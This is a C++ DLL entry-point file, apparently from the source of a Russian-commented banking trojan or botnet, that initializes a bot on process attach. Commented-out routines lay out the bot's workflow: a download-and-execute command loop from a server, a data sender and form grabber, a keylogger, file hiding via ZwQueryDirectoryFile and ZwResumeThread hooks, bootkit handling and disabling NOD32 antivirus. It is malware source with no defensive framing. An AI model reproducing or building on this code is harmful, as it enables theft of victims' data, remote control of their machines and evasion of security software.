// dllmain.cpp: определяет точку входа для приложения DLL.
#include "stdafx.h"
#include <windows.h>

#include "GetApi.h"
#include "BotCore.h"


#pragma comment(linker, "/ENTRY:MyDllMain" )

//------------------------------------------------------------------------------


//------------------------------------------------------------------------
//  Функция инициализаци DLL
//------------------------------------------------------------------------
void InitializeDLL()
{
	BOT::Initialize();
}



/*

DWORD WINAPI LoaderRoutine(LPVOID Data)
{
	BOT::Initialize(ProcessLoader);

	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");

	switch( BOT::GetBotType() )
	{
		case BotBootkit: //если стартовали из под буткита, то удаляем ring3 бота из автозагрузки
			BOT::UninstallService();
			BOT::DeleteAutorunBot();
			break;
	}

	//UnhookDlls();

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();

	// Регистрируем глобальный менеджер задач
	InitializeTaskManager(NULL, true);

	// Инициализируем систему отправки статистической информации
	PP_DBGRPT_FUNCTION_CALL(DebugReportInit());

	// Вызываем событие
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		return 0; 
	}

	// 402_pl запуск цикла получения команд (он получается в другом процессе)
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("402_pl"));

	// Запускаем поток отправки данных
	DataGrabber::StartDataSender();

	// Стартуем поток обновления списка процессов кейлогера
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;

	#ifdef VideoRecorderH
		#ifndef VideoProcessSvchost
			if( VideoProcess::Start() )
				DLLDBG( "Main", "Запустили видео процесс" );
			else
				DLLDBG( "Main", "ERROR: не запустился видео процесс" );
		#endif //VideoProcessSvchost
	#endif

	DLLDBG("====>Bot Loader", "Стартуем выполнение команд");
	while (true)
	{
		// 403_pl цикл получения команд
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("403_pl"));
		
		DownloadAndExecuteCommand(NULL, NULL);

		// "Гениальность" проектирования взаимосвязи бота и его сервера
		// отправка стартовой информации должна идти только после получения
		// команды
		if (!FirstSended)
		{
			DLLDBG("====>Bot Loader", "Отправляем информацию о системе");
			FirstSended = SendFirstInfo();
		}


		// Приостанавливаем выполнение команд
		if (!TaskManagerSleep(NULL))
			break;
	}

	return 0;
}
*/

/*
DWORD WINAPI ExplorerMain(LPVOID Data)
{
	DLLDBG("====>Bot DLL", "Запускаем бот. Префикс [%s]", GetPrefix().t_str());
	
	//копируем префикс из временного файла, который был сохранен инсталером буткита
	BOT::SavePrefixFromTemporaryFile(false);
	//UnhookDlls();

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();
	
	// Инициализируем систему отправки статистической информации
	PP_DBGRPT_FUNCTION_CALL(DebugReportInit());
	BOT::AddHiddenFile(GetHashFileNameBotPlug());

	HookZwResumeThread();
	HookZwQueryDirectoryFile();

	DLLDBG("====>Bot DLL", "Стартуем Loader ()");
	RunLoaderRoutine();

	#ifdef VideoProcessSvchost
		RunVideoProcess();
	#endif

	DLLDBG( "Main", "Отключаем NOD32" );
	OffNOD32();

	// 401_pl запуск BotPlug
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("401_pl"));
	
	#ifdef GrabberH
		if ( dwFirst && !dwGrabberRun ) 
		{
			DLLDBG("====>Bot DLL", "Стартуем грабер");
			MegaJump( GrabberThread );
		}
	#endif

	//MegaJump(AvFuckThread);


	// Вызываем событие мтарта експлорера

//	if (dwFirst)
//		ExplorerFirstStart(NULL);


	ExplorerStart(NULL);


	return 0;
}
*/


//------------------------------------------------------------------------
//  Точка входа DLL
//------------------------------------------------------------------------
BOOL APIENTRY MyDllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			InitializeDLL();
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	
	return TRUE;
}
